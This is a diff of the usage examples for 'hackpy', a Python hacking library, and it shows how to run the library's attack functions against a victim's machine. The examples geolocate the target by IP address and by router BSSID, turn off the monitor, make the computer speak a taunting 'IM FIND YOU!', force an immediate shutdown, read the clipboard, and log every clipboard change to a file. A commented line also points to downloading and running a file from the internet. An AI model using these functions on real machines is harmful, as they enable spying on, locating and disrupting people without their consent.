@@ -31,16 +31,30 @@ print('[?] - Other Information about IP:\n' + str(data))
 # Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}
 
 # Get router bssid:
-bssid_string = hackpy.router()
+bssid_string = hackpy.router() # BETA
 # Find LATITUDE and LONGITUDE with router BSSID:
 data = hackpy.bssid_locate(bssid_string)
 print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))
 
 # Nircmdc reference: https://nircmd.nirsoft.net
-hackpy.nircmdc('monitor off')
-hackpy.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
+hackpy.command.nircmdc('monitor off')
+hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
 # System commands
-hackpy.system('shutdown -s -t 0')
+hackpy.command.system('shutdown -s -t 0')
+
+# Get text from clipboard:
+data = hackpy.clipboard.get()
+print('Text in clipboard is ' + data)
+
+# Set text to clipboard:
+hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
+
+# Clipboard logger:
+hackpy.clipboard.logger('clip_logs.txt') # Log ALL clipboard changes.
+# It is recommended to use with threading !!!
+
+# Download python and install it:
+hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
 
 # Load and execute file from internet
 # file = hackpy.wget(direct.link.here)
